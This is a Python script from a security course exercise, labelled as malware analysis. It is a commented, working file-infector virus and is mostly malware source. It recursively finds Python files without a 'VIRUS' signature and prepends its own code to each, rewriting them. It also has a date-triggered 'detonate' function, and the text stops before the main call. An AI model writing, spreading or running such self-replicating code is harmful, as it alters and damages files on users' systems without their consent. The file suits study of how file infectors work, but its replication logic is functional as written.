# Script: Ops 301d6 Class 14 Ops Challenge Solution
# Author: Nicholas Loiacono
# Date: 03/30/2023
# Purpose: Python Malware Analysis
# Resources: Chat GPT


# Start


# Shebang line to specify the interpreter to use for running the script.
#!/usr/bin/python3

# Importing the 'os' module that provides a way of interacting with the operating system.
# Importing the 'datetime' module that supplies classes for working with dates and times.
import os
import datetime

# Defining a constant variable 'SIGNATURE' and assigning it a value of "VIRUS".
SIGNATURE = "VIRUS"

# Function to locate all the files with .py extension in the specified path.
# This function takes the 'path' argument, which is the absolute path to the directory where to start searching files from.
# It returns a list of files that are to be targeted by the virus.
def locate(path):
    files_targeted = []         # Initializing an empty list for files to be targeted.
    filelist = os.listdir(path)    # Get a list of all files and directories in the specified path.
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):    # Check if the current file is a directory.
            files_targeted.extend(locate(path+"/"+fname))    # Recursively call the locate() function on the subdirectory.
        elif fname[-3:] == ".py":    # Check if the current file has a '.py' extension.
            infected = False    # Initialize a flag for the infected file.
            for line in open(path+"/"+fname):    # Open the current file and loop through each line.
                if SIGNATURE in line:    # Check if the current line contains the virus signature.
                    infected = True    # Set the infected flag to True.
                    break    # Break out of the loop.
            if infected == False:    # Check if the infected flag is False, indicating that the file is not infected.
                files_targeted.append(path+"/"+fname)    # Append the file path to the files_targeted list.
    return files_targeted

# Function to infect the targeted files.
# This function takes the 'files_targeted' argument, which is a list of files to be infected.
# It opens the virus script and reads the first 39 lines to get the virus code.
# Then it prepends the virus code to the beginning of each targeted file.
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))    # Open the virus script file.
    virusstring = ""    # Initialize an empty string for the virus code.
    for i,line in enumerate(virus):    # Loop through each line of the virus script.
        if 0 <= i < 39:    # Check if the line number is within the range of the virus code.
            virusstring += line    # Append the line to the virusstring variable.
    virus.close    # Close the virus script file.
    for fname in files_targeted:    # Loop through each file in the files_targeted list.
        f = open(fname)    # Open the file for reading.
        temp = f.read()    # Read the content of the file.
        f.close()    # Close the file.
        f = open(fname,"w")    # Re-open the file for writing.
        f.write(virusstring + temp)    # Prepend the virus code to the file content and write to the file.
        f.close()    # Close the file.

# Function to detonate the virus.
# This function checks if the current date is May 9th and prints a message to indicate that the virus has been activated.
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# Call the locate() function with the


# End